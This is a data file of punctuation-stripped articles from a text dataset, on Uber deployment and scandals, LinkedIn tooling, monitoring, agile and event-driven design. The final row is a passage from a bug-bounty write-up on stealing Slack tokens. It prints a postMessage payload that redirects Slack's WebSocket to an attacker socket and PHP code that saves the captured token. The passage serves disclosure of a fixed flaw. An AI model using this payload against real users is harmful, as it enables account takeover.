deployment   Zero downtime for upgrades  Micro Deploy s global gradual rollout system deploys the same version of the software to multiple data centers of different role and configuration  Fully automated deployments enable any engineer to roll out a change to their own services globally  We can be on our own  together   Early  automated error detection  Micro Deploy integrates monitoring systems that detect anomalies early  Humans don t have to watch for significant degrade in I O performance  uncaught exceptions  HTTP error codes  or issues with request throughput and server load   Deploy uses this monitoring data to ensure that the system remains stable during a new version s rollout   Outage prevention  Micro Deploy uses the monitoring data to stop and roll back a build to a stable version in the case of an anomaly  We occasionally see false positives  but better safe than sorry  Rollback is automatic and often occurs long before all hosts have the new version  Ideally  the rollback occurs in a canary area where a small enough batch of machines safeguards any failures from having external impact  We have to keep these unruly additions contained before they make our five minute short about the latest development test into a feature film about damage control and the machines foiling everything we were working toward   Reliable rollouts  Micro Deploy s highly configurable workflow engine orchestrates the various phases of upgrades  As a distributed system   Deploy can survive the unexpected shutdown of any host or rack  including the hosts running the workflow  during these upgrades   Ease of use  Micro Deploy s web based application exposes all these features in a rich user interface  Any engineer can just access  Deploy via browser and deploy their services to production instantly   REST API for deeper integration  Micro Deploy s REST API enables third party tools to integrate with its features   From Mission to Commission  We designed Micro Deploy to avoid unnecessary deployment processes and create confidence that the rollout would occur correctly  If not  the system catches the occasional buggy upgrade quickly  with minimal consequence to production  In this way  if we make a stray mistake  we re just working the system  Like many other major engineering initiatives at Uber   Deploy was conceived  implemented in its initial form  and rolled out into production in several fun filled months   After two months in development  we onboarded Uber s first services to Micro Deploy  and 50  of all services were using  Deploy in its first five months of production  That s productive   As of mid 2016  Uber s back end is an ever changing  massively distributed system spread across multiple data centers  Our engineers are now spread across a dozen offices in several countries and continents  Ninety nine percent of all Uber software ships with  Deploy  that s an A   Micro Deploy gives our engineers everywhere speed  autonomy  and end to end ownership  Engineers write code  review it  test it  and put it into production the same day   By going small  Micro Deploy has greatly impacted our engineering  and we are excited to continue to add improvements as we learn about how other distributed technology companies manage their builds  Builders  keep building   Mathias Schwarz is a software engineer in Uber s Aarhus engineering office  and wrote this article with Mrina Natarajan on the technical writing team,"[1010 1393 673 597 1225 1300 550 1351 952 1016 92]"
1016,training-dataset/business/1223.txt,business,The Uber Conflation   Stratechery by Ben ThompsonThe latest Uber scandal   yes  it s getting hard to keep track   is Greyballing  From the New York Times   Uber has for years engaged in a worldwide program to deceive the authorities in markets where its low cost ride hailing service was resisted by law enforcement or  in some instances  had been banned  The program  involving a tool called Greyball  uses data collected from the Uber app and other techniques to identify and circumvent officials who were trying to clamp down on the ride hailing service  Uber used these methods to evade the authorities in cities like Boston  Paris and Las Vegas  and in countries like Australia  China and South Korea  At a time when Uber is already under scrutiny for its boundary pushing workplace culture  its use of the Greyball tool underscores the lengths to which the company will go to dominate its market   Note the easy conflation  avoiding regulators  allegedly tolerating sexual harassment  it s all the same thing  Well  I disagree   Uber s Three Questions  The first thing to understand about not just the current Uber controversy  controversies   but all Uber controversies is that while they are not usually articulated as such  in fact multiple questions are being debated   Question 1  Is Uber a viable business that can one day go public  make a profit  and return the unprecedented amount of capital it has raised   Is Uber a viable business that can one day go public  make a profit  and return the unprecedented amount of capital it has raised  Question 2  Is Uber s approach to regulation wrong   Is Uber s approach to regulation wrong  Question 3  Is Uber wrong with regards to the specific issue at the center of this controversy   I and many others have spent plenty of time on the first question  it s not the focus of today s article  Rather  it s the distinction between questions 2 and 3   that easy conflation made by the New York Times   that I find illuminating   Uber and Regulation  There is no disputing that Uber has operated in the gray zone  perhaps adhering to the letter of the law but certainly not the spirit  For example  in The Upstarts  a new book about the founding stories of Uber and Airbnb  Brad Stone explains Uber s initial service in San Francisco   In the summer of 2010   San Francisco Metropolitan Taxi Agency director Christiane  Hayashi s phone started ringing off the hook  and it wouldn t stop for four years  Taxi drivers were incensed  a new app called UberCab allowed rival limo drivers to act like taxis  By law only taxis could pick up passengers who hailed them on the street  and cabs were required to use the fare calculating meter that was tested and certified by the government  Limos and town cars  however  had to be  prearranged  by passengers  typically by a phone call to a driver or a central dispatch  Uber didn t just blur this distinction  it wiped it out entirely with electronic hails and by using the iPhone as a fare meter  Every time Hayashi picked up the phone  another driver or fleet owner was screaming  This is illegal  Why are you allowing it  What are you doing about this   Ultimately  Hayashi could do nothing  Uber drivers did not pick up passengers who hailed them on the street  but were dispatched via the Uber app  UberCab   despite the name  which was soon changed   was not a taxi service  even if the service offered was taxi like   That right there is enough for many observers to cry foul  getting off on a technicality does not mean a business is okay  Those cries have only grown louder as Uber has entered more and more cities with services like UberX that are even more murky from a regulatory perspective  now the questions are not just about hailing and dispatch  but licensing  insurance  and background checks  along with the ever present questions about the employee contractor status of Uber s drivers  Every technicality that Uber takes advantage of  or every new law it gets passed by leveraging lobbyists and by bringing its users to bear on local politicians  is taken by many to be more evidence of a company that considers itself above the law   The reason this question matters is because if one takes this viewpoint  then the latest allegations against Uber are not independent events  but rather manifestations of a problem that is endemic to the company  And  in that light  I can understand the calls for Kalanick s removal at a minimum  I will do said position the respect of not arguing against it   On the flipside  I  for one  view Uber s regulatory maneuvering in a much more positive light  After all  thinking about the  spirit of the law  can lead to a very different conclusion  the purpose of taxi regulation  at least in theory  was not to entrench local monopolies but rather to ensure safety  If those goals can be met through technology   GPS tracking  reputation scoring  and the greater availability of transportation options  particularly late at night   then it is the taxi companies and captured regulators violating said spirit  Moreover  the fact remains that both Uber riders and drivers continue to vote with their feet  Uber has gone far beyond displacing taxis to generating entirely new demand  and when necessary  leveraging said riders and drivers to shift regulation in its favor  I think it is naive to think that said changes   changes that benefit not just Uber but drivers  riders  and local businesses   would have come about simply by asking nicely   The Uber Conflation  But I digress  I know many of you disagree with me on these points  and that s okay   having this debate is important  The reason to point this question out  though  was perhaps best exemplified by the  DeleteUber campaign that kicked off Uber s terrible month  As you may recall the campaign sprang up on social media after Uber was accused of strikebreaking for having disabled surge pricing while taxi drivers protested against President Trump s executive order banning immigration from seven countries  As I pointed out in a Daily Update   Uber was definitely in a tough position here  the company likely would have been criticized for price gouging had surge pricing sky rocketed  while restricting drivers from visiting JFK would have entailed Uber acting as a direct employer for drivers  as opposed to a neutral platform  this point is in contention in courts all over the U S    And  I think it s safe to say  a lot of the folks pushing the  DeleteUber campaign were probably not very inclined to like Uber in the first place   That last sentence captures what I m driving at  and why separating these questions is so clarifying  and  by the way  surge pricing is another reason why a not insignificant number of people feel that Uber is evil    Kalanick s Real Mistake   DeleteUber was more significant than it might seem  it was the first time that an Uber controversy actually affected demand in an externally visible way  given that controlling demand is the key to Uber s competitive advantage  that is a very big deal indeed   However  the real bombshell was an explosive blog post from a  former  female engineer named Susan Fowler Rigetti alleging sexual harassment that was not only tolerated by Uber HR but actually used against the accuser  Said allegations  if true  and I have no reason to believe they are not   are ipso facto unacceptable and heads should roll   up to and including Kalanick if he was aware of the case in question  And Rigetti deserves praise  sadly  the novelty of her allegations may very well be her willingness to go public  based on conversations with multiple friends it s often perceived as being easier to put up with sexual harassment than run the risk of being blacklisted   The thornier issue is if Kalanick did not know  surely he has ultimate responsibility for creating a culture that allegedly tolerated such behavior  Indeed  he does  That s why I drew a line from Kalanick s refusal to fire an executive that allegedly threatened a journalist to the behavior alleged in that blog post  culture is the accumulation of decisions  reinforced by success  and Uber has collectively made a lot of decisions that push the line and been amply rewarded   That  though  is why I drew the distinctions in this post  Kalanick s mistake was in not clearly defining  communicating  and enforcing accountability on actions that pushed the line but had nothing to do with the company s regulatory fight  In fact  it was even more critical for Uber than for just about any other company to have its own house in order  the very nature of the company s business created the conditions for living above the law to become culturally acceptable   praised even   To that end  those who already disapprove of Uber s regulatory approach  that see the latest events as being part and parcel of what makes Uber Uber  well  that may be an unfair conflation  but Kalanick has only himself to blame  pushing the line on regulations didn t necessarily need to equate to pushing the line internally  but to Kalanick it was all one and the same  The conflation started at the top   Taking Responsibility  Even if you agree with me about Uber and regulation  it s completely reasonable to still argue that the company needs a change in leadership for the exact reasons I just laid out  I thought long and hard about making that exact argument  Moreover  if Uber s scandals start impacting demand for the service  or end up impacting the company s ability to retain and hire employees  there may not be a choice in the matter   Still  it s worth keeping in mind that many of Uber s scandals implicate not just Uber but tech as a whole  The industry s problem when it comes to hiring and retaining women is very well documented  and sexual harassment is hardly limited to Uber  Moreover  one of Uber s other  scandals    the fact that Kalanick asked Amit Singhal to step down as Senior Vice President of Engineering after not disclosing a sexual harassment claim at Google   reflected far worse on Google than Uber  if Singhal committed a fireable offense the search giant should have fired the man who rewrote their search engine  instead someone in the know dribbled out allegations that happened to damage a company they view as a threat  And while Google s allegations about Uber acquisition Otto having stolen intellectual property are very serious  it s worth remembering that the entire industry is basically built on theft   including Google s keyword advertising   Indeed  more than anything  what gives me pause in this entire Uber affair is the general sordidness of all of Silicon Valley when it comes to market opportunities the size of Uber s  The sad truth is that for too many this is the first case of sexual harassment they ve cared about  not because of the victim  but because of the potential for taking Uber down   The fact of the matter is that we as an industry are responsible for Uber too  We ve created a world that simultaneously celebrates rule breaking and undervalues women  and minorities   full of investors and companies that are utterly ruthless when money is on the line  while cloaking said ambition in fluff about changing the world   That s the sad irony of the situation  changing the world is exactly what Uber is doing  for all his mistakes Kalanick has been one of the most effective CEOs tech has ever seen  Maybe Kalanick has finally seen the light and can change   I think he deserves the chance  even as I understand the skepticism   and if he cannot then by all means show him the door  in the meantime we can all certainly look in the mirror,"[1016 1086 281 673 952 1300 778 1295 1010 809 843]"
1027,training-dataset/engineering/334.txt,engineering,Great Tools for Engineers  Refactoring Across Multiple Code Bases with Gradle and IntelliJ IDEALinkedIn engineers require tooling that scales really well  and we never stop improving it  Even at a smaller scale  providing great tools for engineers is key to winning business and retaining top talent  This post is about working with code that lives in many separate code repositories  while still being productive and efficient in the process   Repository and SCM agnostic development at LinkedIn  At LinkedIn  we want to create a development environment where the underlying SCM  source control management  system becomes an implementation detail  We built an abstraction layer on top of the source code repositories called  multiproduct   Think of a multiproduct layer as a code base that is a unit of building  testing  and releasing some software  such as a web app  a service  or a set of software libraries  Multiproducts at LinkedIn can be checked out  and a new feature can be implemented and submitted for review  without interacting directly with the SCM system  A software project  wrapped with multiproduct abstraction  can have the source code stashed in multiple separate code repositories  At the moment  this is a standard scenario for certain kinds of projects at LinkedIn  like services that keep configs in a separate repository or open source wrapper projects that keep public code in GitHub  Multiproduct abstraction does not completely override interactions with SCM system  On a daily basis  engineers rebase their branches  work with revision history  and interact with SCM system in other ways  More about the multiproduct concept will be covered in future articles  Jens Pillgram Larsen s post  Find the Seams  is a great introduction   LinkedIn s multiproduct abstraction presents a boundary between code bases  The challenge emerges when a code change needs to span this boundary  For example  when a common library developed in a separate multiproduct changes its API  clients that use it  have a binary dependency on the library  need to be updated  So  there must be a change in the library code  multiproduct A  and in the client code  multiproduct B   This generates more overhead  one change in the library requires the new version to be published  and then another change is needed in the client code so that it uses the new version of the library  The result is more independent changes  manual ordering work  more CI builds  and binary version management   There are  however  benefits of the boundary between multiproducts  Working with software components integrated at a binary level via dependency management enables teams to move faster by making it possible to ship ambitious  incompatible changes without the need to update all consumers at once  In multiproduct  thoughtful design of the public API is a necessary practice  and this positively affects the overall architecture  Each team needs to continually care about dependency management to avoid having a complicated dependency graph  unnecessary dependencies  and dependency cycles  It is more work at first  but it pushes the teams harder to keep the architecture clean and healthy,"[1027 713 1399 1225 656 234 890 1217 1351 800 683]"
1029,training-dataset/engineering/757.txt,engineering,SyntheticMonitoringtags   Synthetic monitoring  also called semantic monitoring  1   runs a subset of an application s automated tests against the live production system on a regular basis  The results are pushed into the monitoring service  which triggers alerts in case of failures  This technique combines automated testing with monitoring in order to detect failing business requirements in production   In the age of small independent services and frequent deployments it s very difficult to test pre production with the exact same combination of versions as they will later exist in production  One way to mitigate this problem is to extend testability from pre production into production environments   the idea behind QA in production  Doing this shifts the mindset from a focus on Mean Time Between Failures  MTBF  towards a focus on Mean Time To Recovery  MTTR    MTTR   MTBF  for most types of F    John Allspaw  A technique for this is synthetic monitoring  which we used at a client who is a digital marketplace for cars with millions of classifieds across a dozen countries  They have close to a hundred services in production  each deployed multiple times a day  Tests are run in a ContinuousDelivery pipeline before the service is deployed to production  The dependencies for the integration tests do not use TestDoubles  instead the tests run against components in production   Here is an example of these tests that s well suited for synthetic monitoring  It impersonates a user adding a classified to her list of favourites  The steps she takes are as follows   Go to the homepage  log in and remove all favourites  if any  At this point the favourites counter is zero  Select some filtering criteria and execute search  Add two entries from the results to the favourites by clicking the star  The stars change from grey to yellow  Go to the homepage  At this point the favourites counter should be two   In order to exclude test requests from analytics we add a parameter  such as excluderequests true   to the URL  The parameter is handed over transitively to all downstream services  each of which suppresses analytics and third party scripts when it is set to true   We could use the excluderequests parameter to mark the data as synthetic in the backend datastores  In our case this isn t relevant since we re use the same user account and clean out its state at the beginning of the test  The downside is that we cannot run this test concurrently  Alternatively  we could create a new user account for each test run  To make the test users easily identifiable these accounts would have a specific pre or postfix in the email address  Another option would be to have a custom HTTP header that would be sent in every request to identify it as a test  though this is more common for APIs   Our tests run with the Selenium webdriver and are executed with PhantomJS every 5 minutes against the service in production  The test results are fed into the monitoring system and displayed on the team s dashboard  Depending on the importance of the tested feature  failures can also trigger alerts for on call duties   A selection of Broad Stack Tests at the top of the Test Pyramid are well suited to use for synthetic monitoring  These would be UI tests  User Journey Tests  User Acceptance tests or End to End tests for web applications  or Consumer Driven Contract tests  CDCs  for APIs  An alternative to running a suite of UI tests   for example in the context of batch processing jobs   would be to feed a synthetic transaction into the system and assert on its desired final state such as a database entry  a message on a queue or a file in a directory   Further Reading Building Microservices  Designing Fine Grained Systems    by Sam Newman  Testing Strategies in a Microservice Architecture    by Toby Clemson  Acknowledgements Thanks to Henry Lawson for his feedback  And a special thanks to Martin Fowler for his support  suggestions and time spent helping us improve this Bliki   Translations  Chinese,"[1029 150 1252 300 1235 1351 550 251 61 298 92]"
1042,training-dataset/product/379.txt,product,How to Marry Agile Change Management and Lean Software DevelopmentThe concept of lean software development originated in the manufacturing sector  Originating in Japan and utilized specifically in the Toyota manufacturing process the idea is to eliminate waste of any and all kinds   Now that same bank of principals has begun to be applied to software development  Applying lean practices in software development  however  poses several challenges  For example  due to the sequential nature of lean software development bugs can go undetected for a long time   To solve this  agile change management practices were merged with lean software development  Agile practices include testing while in the course of development  continuous integration of small codes  working in iterations and have cross functional teams working on the development of a software   The Rise of Agile Change Management and Lean Software Development  The term  lean  was first used as the English word  translated from Japanese  to describe the approach taken by Toyota to speed up vehicle manufacture while retaining quality control    It was introduced by James Womack  Daniel Roos and Daniel Jones in their book  The Machine that Changed the World  The Story of Lean Production   A year later  after noting the application of the concept in software development  the term was used as the title for a conference organized by ESPRIT in Stuttgart Germany   In 1993  Robert Charette suggested that this approach could actually be used to improve software development and manage the risks associated with it   Agile software development began as a radical idea in which emphasis is placed on collaboration and team decision  This has become the most widely used approach in software development  It has proven to be more effective and able to achieve much better results   Merging these practices with those of lean development has made software development a fast and effective process   How Lean Software Development and Agile Change Management are Symbiotic  Lean software development is based on several principles all aimed at reducing spending on development activities that do not add value for the end customer  The first is eliminating waste which involves bypassing any activities that add no value to the software such as unnecessary approvals and paperwork  Delivering quality rather than a repeat of existing software is yet another core principle in lean practice  Aim at being useful to the end user rather than conforming to the requirements  Iterations are the best way to go about this with short repeatable cycles of development  feedback  and planning   How to Use Agile Change Management and Lean Software Development in Practice  Making concurrent rather than sequential decisions is the ideal lean practice  Fast delivery secures customers and is especially important in staying ahead of the competition  In lean software development  your team needs to do their best so that they deliver  One way to ensure this is to let them choose their preferred methods of working and motivational incentives  Each individual member of the team must be made to feel important   Agile change management and lean software development have been working together in the software development realm successfully for years  The process is now not only much faster but also free from defects   Now  for those readers who have read this until the end  I d like to share with you a cause that is very close to my heart   an organization that works to save dolphins and whales  The International Marine Mammal Project has been leading the fight against the slaughter of dolphins and whales for over 30 years  they even pioneered the  Dolphin Safe  tuna fishing standard which has prevented hundreds of thousands of dolphin deaths every year  If you re interested  check them out and see how you can help,"[1042 596 737 61 370 541 104 712 695 588 830]"
1046,training-dataset/engineering/1097.txt,engineering,ODP  An Infrastructure for On Demand Service ProfilingCoauthors  Tao Feng  John Nicol  Chen Li  Peinan Chen  Hari Ramachandra  LinkedIn has built hundreds of application services  with thousands of instances running in data centers  Optimizing the performance of these services can dramatically improve user experience and reduce operational costs  and profilers are commonly used to help achieve this  LinkedIn s On Demand Profiling infrastructure   ODP   is one method we use to identify these optimizations   Introduction  Profiling is a useful method to improve the performance of services  However  the tooling solutions for profiling don t have fixed standards  are often decentralized  can be costly  and for a company with a large server footprint such as LinkedIn  are inconvenient to use at best   For example  unless a profiler is supported internally  users may need to configure  acquire licenses  and request installation on remote hosts before profiling  In addition  viewing the profiled results often requires manual data transfer or setting up a tunnel from the production environment to the development environment  Lastly  comparing historical data is difficult or even impossible  especially when profiling runs are captured by different users or different profiling tools   ODP is our tooling infrastructure to address these pain points  It allows users to debug service performance issues with little manual effort  It also centralizes profiling data so the data can be shared  archived  and compared with other profiling events  this data sharing also allows known issues to be automatically identified  Moreover  this profiling can be scaled for thousands of services across LinkedIn s data centers  Additionally  this is a plugin based infrastructure  which can be extended to include memory allocation  thread status  profilers for other languages  and more   The generality of this approach is useful  but we ve found few profiling tools that can effectively be used with it so far  For now  we ve developed our own JVM CPU sampling profiler and are investigating profilers for other languages  These profilers are secondary to the tooling infrastructure and may be replaced with future industry standards  but for now  they have proven themselves to be quite effective when used with the overall framework   In this post  we describe the overall architecture of ODP and how ODP helps find performance issues with LinkedIn services   On demand profiler architecture  The following diagram shows the overall architecture of ODP,"[1046 890 1351 673 42 1403 1336 92 1117 695 1373]"
1049,training-dataset/product/1245.txt,product,What do you mean by  Event Driven  Towards the end of last year I attended a workshop with my colleagues in ThoughtWorks to discuss the nature of  event driven  applications  Over the last few years we ve been building lots of systems that make a lot of use of events  and they ve been often praised  and often damned  Our North American office organized a summit  and ThoughtWorks senior developers from all over the world showed up to share ideas   The biggest outcome of the summit was recognizing that when people talk about  events   they actually mean some quite different things  So we spent a lot of time trying to tease out what some useful patterns might be  This note is a brief summary of the main ones we identified   Event Notification This happens when a system sends event messages to notify other systems of a change in its domain  A key element of event notification is that the source system doesn t really care much about the response  Often it doesn t expect any answer at all  or if there is a response that the source does care about  it s indirect  There would be a marked separation between the logic flow that sends the event and any logic flow that responds to some reaction to that event  Event notification is nice because it implies a low level of coupling  and is pretty simple to set up  It can become problematic  however  if there really is a logical flow that runs over various event notifications  The problem is that it can be hard to see such a flow as it s not explicit in any program text  Often the only way to figure out this flow is from monitoring a live system  This can make it hard to debug and modify such a flow  The danger is that it s very easy to make nicely decoupled systems with event notification  without realizing that you re losing sight of that larger scale flow  and thus set yourself up for trouble in future years  The pattern is still very useful  but you have to be careful of the trap  A simple example of this trap is when an event is used as a passive aggressive command  This happens when the source system expects the recipient to carry out an action  and ought to use a command message to show that intention  but styles the message as an event instead  An event need not carry much data on it  often just some id information and a link back to the sender that can be queried for more information  The receiver knows something has changed  may get some minimal information on the nature of the change  but then issues a request back to the sender to decide what to do next   Event Carried State Transfer This pattern shows up when you want to update clients of a system in such a way that they don t need to contact the source system in order to do further work  A customer management system might fire off events whenever a customer changes their details  such as an address  with events that contain details of the data that changed  A recipient can then update it s own copy of customer data with the changes  so that it never needs to talk to the main customer system in order to do its work in the future  An obvious down side of this pattern is that there s lots of data schlepped around and lots of copies  But that s less of a problem in an age of abundant storage  What we gain is greater resilience  since the recipient systems can function if the customer system is becomes unavailable  We reduce latency  as there s no remote call required to access customer information  We don t have to worry about load on the customer system to satisfy queries from all the consumer systems  But it does involve more complexity on the receiver  since it has to sort out maintaining all the state  when it s usually easier just to call the sender for more information when needed   Event Sourcing The core idea of event sourcing is that whenever we make a change to the state of a system  we record that state change as an event  and we can confidently rebuild the system state by reprocessing the events at any time in the future  The event store becomes the principal source of truth  and the system state is purely derived from it  For programmers  the best example of this is a version control system  The log of all the commits is the event store and the working copy of the source tree is the system state  Event sourcing introduces a lot of issues  which I won t go into here  but I do want to highlight some common misconceptions  There s no need for event processing to be asynchronous  consider the case of updating a local git repository   that s entirely a synchronous operation  as is updating a centralized version control system like subversion  Certainly having all these commits allows you to do all sorts of interesting behaviors  git is the great example  but the core commit is fundamentally a simple action  Another common mistake is to assume that everyone using an event sourced system should understand and access the event log to determine useful data  But knowledge of the event log can be limited  I m writing this in an editor that is ignorant of all the commits in my source tree  it just assumes there is a file on the disk  Much of the processing in an event sourced system can be based on a useful working copy  Only elements that really need the information in the event log should have to manipulate it  We can have multiple working copies with different schema  if that helps  but usually there should be a clear separation between domain processing and deriving a working copy from the event log  When working with an event log  it is often useful to build snapshots of the working copy so that you don t have to process all the events from scratch every time you need a working copy  Indeed there is a duality here  we can look at the event log as either a list of changes  or as a list of states  We can derive one from the other  Version control systems often mix snapshots and deltas in their event log in order to get the best performance   1  Event sourcing has many interesting benefits  which easily come to mind when thinking of the value of version control systems  The event log provides a strong audit capability  accounting transactions are an event source for account balances   We can recreate historic states by replaying the event log up to a point  We can explore alternative histories by injecting hypothetical events when replaying  Event sourcing make it plausible to have non durable working copies  such as a Memory Image  Event sourcing does have its problems  Replaying events becomes problematic when results depend on interactions with outside systems  We have to figure out how to deal with changes in the schema of events over time  Many people find the event processing adds a lot of complexity to an application  although I do wonder if that s more due to poor separation between components that derive a working copy and components that do the domain processing    CQRS Command Query Responsibility Segregation  CQRS  is the notion of having separate data structures for reading and writing information  Strictly CQRS isn t really about events  since you can use CQRS without any events present in your design  But commonly people do combine CQRS with the earlier patterns here  hence their presence at the summit  The justification for CQRS is that in complex domains  a single model to handle both reads and writes gets too complicated  and we can simplify by separating the models  This is particularly appealing when you have a difference in access patterns  such as lots of reads and very few writes  But the gain for using CQRS has to be balanced against the additional complexity of having separate models  I find many of my colleagues are deeply wary of using CQRS  finding it often misused   Making sense of these patterns As a sort of software botanist  keen to collect samples  I find this a tricky terrain  The core problem is confusing the different patterns  On one project the capable and experienced project manager told me that event sourcing had been a disaster   any change took twice the work to update both the read and write models  Just in that phrase I can detect a potential confusion between event sourcing and CQRS   so how can I figure out which was culprit  The tech lead on the project claimed the main problem was lots of asynchronous communications  certainly a known complexity booster  but not one that s a necessary part of either event sourcing or CQRS  Furthermore we have to beware that all these patterns are good in the right place and bad when put on the wrong terrain  But it s hard to figure out what the right terrain is when we conflate the patterns  I d love to write some definitive treatise that sorts all this confusion out  and gives solid guidelines on how to do each pattern well  and when it should be used  Sadly I don t have the time to do it  I write this note in the hope it will be useful  but am quite aware that it falls well short of what is really needed,"[1049 902 613 606 778 1351 890 1405 92 889 1336]"
1068,training-dataset/engineering/1188.txt,engineering,Hacking Slack using postMessage and WebSocket reconnect to steal your precious tokenTLDR  I was able to create a malicious page that would reconnect your Slack WebSocket to my own WebSocket to steal your private Slack token  Slack fixed the bug in 5 hours  on a Friday  and paid me  3 000 for it   Recently a bug I found in Slack was published on HackerOne and I wanted to explain it  and the method I used to discover it   Background  Using window addEventListener  message   func  and window postMessage   to pass messages is a really convenient way of performing Cross Origin communication  However  the biggest pitfall  which we ve covered multiple times before  is not checking the origin of the message   Last week I was cruising around on Slack  using the version in the browser  In Chrome  there s a really neat way of watching if any object has any listeners  You can find it below Event Listeners in the Elements  tab   I noticed this was indeed the case for Slack  they were passing messages to a listener on the window  object   The listener function started like this   var _receivePostedMessageFromChildWindow   function   evt     if    evt      evt   data      evt   data   message_type     TS   utility   calls_log   logEvent    event   _utility_calls_config   log_events   invalid_msg_from_child_window   value   evt     return   if   evt   data   origin_window_type     TS   utility   calls   window_types   call_window     switch   evt   data   message_type     case TS   utility   calls   messages_from_call_window_types   update_mini_panel       break   case TS   utility   calls   messages_from_call_window_types   set_call_window_loaded            As you see  nowhere did they validate the evt origin or evt source being sent with the message  These two are read only properties that cannot be spoofed  Not validating them was a clear indication to me that I could start do fun stuff  like accessing the functions using postMessage to this window from another window I controlled   Creating a proper PoC  Now  just submitting that they were missing a origin validation is not fun at all and would likely not show them the true severity of the issue  I had to come up with a better exploit scenario by looking through the code   The first challenge I had to overcome was   If I would like to attack anyone with my payload  how would I know what team URL I should use   Quickly  I noticed that https   my slack com would redirect to your current Slack instance   That was awesome   Now  looking through all events I could send  I noticed they had done a good job of ensuring the calls were safe  Even though I could actually control the browser notifications sent by Slack  or switch to another chat  none of the events was punchy enough   A boring PoC could have been   I can shut down your call to someone  if you open my malicious page first and then call them    While digging deeper  I also noticed that there were a lot of references to calls being made   if   event   data   message_type    TS   utility   calls   messages_to_call_window_types   ms_msg      event   data   reply_to     TS   utility   calls_log   logEvent    event   _calls_config   log_events   message_from_parent_window   value   event   data       This made it clear that a big chunk of this functionality was due to the actual call functionality in Slack   This function  when being used  resides in another window but communication actually had to be made with the main Slack window  this was a big reason why they had implemented postMessage    Looking at the  call endpoint  I noticed that it also had the same issue  not verifying the origin of the messages  However  there were actually more interesting events here  Exciting   I ll get to that in a bit   The problem I had though was that the  call  endpoint needed a slug  like  call UXXXX using an ID of a group or a user  This brought me back to my original challenge   How can I do the attack on anyone  even outside my team     Playing with Slack s route  I noticed that the slug me would actually work  So by using the following URL   https   slack com call me  it would route you to  call   which weirdly enough breaks if you reload the page  on your current instance   I now had   a redirect to the user s current Slack instance  a page using the other end of the postMessage  dance  which we should be able to find something fun to play with in the list of events  a URL that would work for any Slack user  a non working page  BUT    it was using a postMessage  listener   This was everything I needed   Event digging  Now  looking through the events that were possible to send  there was one which stood out to me   Using the breakpoint mode in Chrome  we traverse down this function  Inside it  there was another chunk of message handlers   So what this meant was due to the non verification of origins  I was able to control messages being parsed by the main application  I was also able to control messages being sent to the call window  and one of the events in this window  had another chunk of functions exposed to cross domain control if I used the event    origin_window_type     incoming_call     message_type     ms_msg   At this point I became certain it was only a matter of time until I found an interesting PoC to give to the Slack team   Pinpointing interesting events  So  yea  I tried a lot of events  This was the list I had to play with   accounts_changed     apps_changed   imsg    bot_added   imsg    bot_changed   imsg    bot_removed   imsg    channel_archive   imsg    channel_converted_to_shared   imsg    channel_created   imsg    channel_deleted   imsg    channel_history_changed   imsg    channel_history_changed_worker   imsg    channel_joined   imsg    channel_left   imsg    channel_marked   imsg    channel_rename   imsg    channel_unarchive   imsg    commands_changed   imsg    dnd_override   imsg    dnd_updated   imsg    dnd_updated_user   imsg    email_domain_changed   imsg    emoji_changed   imsg    enterprise_rename   imsg    error   imsg    file_change   imsg    file_comment_added   imsg    file_comment_deleted   imsg    file_comment_edited   imsg    file_created   imsg    file_deleted   imsg    file_private   imsg    file_public   imsg    file_shared   imsg    file_unshared   imsg    goodbye   imsg    group_archive   imsg    group_close   imsg    group_converted_to_shared   imsg    group_deleted   imsg    group_history_changed   imsg    group_history_changed_worker   imsg    group_joined   imsg    group_left   imsg    group_marked   imsg    group_open   imsg    group_rename   imsg    group_unarchive   imsg    hello   imsg    im_close   imsg    im_created   imsg    im_history_changed   imsg    im_history_changed_worker   imsg    im_marked   imsg    im_open   imsg    issue_change   imsg    manual_presence_change   imsg    member_joined_channel   imsg    member_joined_group   imsg    member_left_channel   imsg    member_left_group   imsg    message   imsg    message_changed   imsg    message_changed_worker   imsg    message_deleted   imsg    message_deleted_worker   imsg    message_replied   imsg    mpim_close   imsg    mpim_history_changed   imsg    mpim_history_changed_worker   imsg    mpim_joined   imsg    mpim_marked   imsg    mpim_open   imsg    msgReceived   imsg    msgReceivedFromParentWindow   imsg    onStartxu     pin_added   imsg    pin_removed   imsg    pref_change   imsg    presence_change   imsg    reaction_added   imsg    reaction_removed   imsg    reconnect_url   imsg    sh_room_join   imsg    sh_room_leave   imsg    sh_room_update   imsg    slack_broadcast   imsg    star_added   imsg    star_removed   imsg    status_change   imsg    subteam_created   imsg    subteam_deleted   imsg    subteam_self_added   imsg    subteam_self_removed   imsg    subteam_updated   imsg    subtype__channel_history_changed   imsg    subtype__channel_join   imsg    subtype__channel_leave   imsg    subtype__channel_purpose   imsg    subtype__channel_topic   imsg    subtype__file_share   imsg    subtype__group_history_changed   imsg    subtype__group_join   imsg    subtype__group_leave   imsg    subtype__group_purpose   imsg    subtype__group_topic   imsg    subtype__im_history_changed   imsg    subtype__message_changed   imsg    subtype__message_deleted   imsg    subtype__message_replied   imsg    subtype__mpim_history_changed   imsg    subtype__mpim_join   imsg    subtype__sh_room_created   imsg    subtype__sh_room_shared   imsg    team_domain_change   imsg    team_icon_change   imsg    team_join   imsg    team_plan_change   imsg    team_pref_change   imsg    team_profile_change   imsg    team_profile_delete   imsg    team_profile_reorder   imsg    team_rename   imsg    teams_joined_shared_channel   imsg    teams_left_shared_channel   imsg    thread_marked   imsg    thread_subscribed   imsg    thread_unsubscribed   imsg    update_thread_state   imsg    user_added_to_team   imsg    user_can_manage_shared_channels   imsg    user_change   imsg    user_read_only_channels   imsg    user_removed_from_team   imsg    user_typing   imsg    Now  I was really interested in the reconnect_url event since it was so basic and also had a clear issue when abusing it   if    TS   ms   fast_reconnects_enabled   return   var url   imsg   url   TS   ms   setReconnectUrl   url    What it does is basically switch the WebSocket URL being used for Slack  Now  the initialization of WebSockets are being done with a GET event using a bunch of parameters  One of the params is called token and contains a xoxs  token which has full and complete access to your Slack account   So I started a local WebSocket myself  I used Ratchet which was easy to set up  I didn t really need a complete socket  only something that would respond properly to the init request  I modified the onOpen  request to look like this   public function onOpen   ConnectionInterface  conn        Store the new connection to send messages to later  this    clients    attach    conn     token    conn    WebSocket    request    getQuery      token     echo sprintf    WE GOT TOKEN   s       token    file_put_contents    token txt     token    echo  New connection     conn  resourceId           It would just dump the token locally  I then started to test sending messages to the window using the console to see if it would connect to my socket instead   window   postMessage     origin_window_type     incoming_call     message_type     ms_msg     msg      reply_to    false    type     reconnect_url     url     ws   your socket domain 9001 websocket AAA             It didn t  Since the connection was already made with the original WebSocket  it didn t initiate a reconnect when calling the event  But when I looked 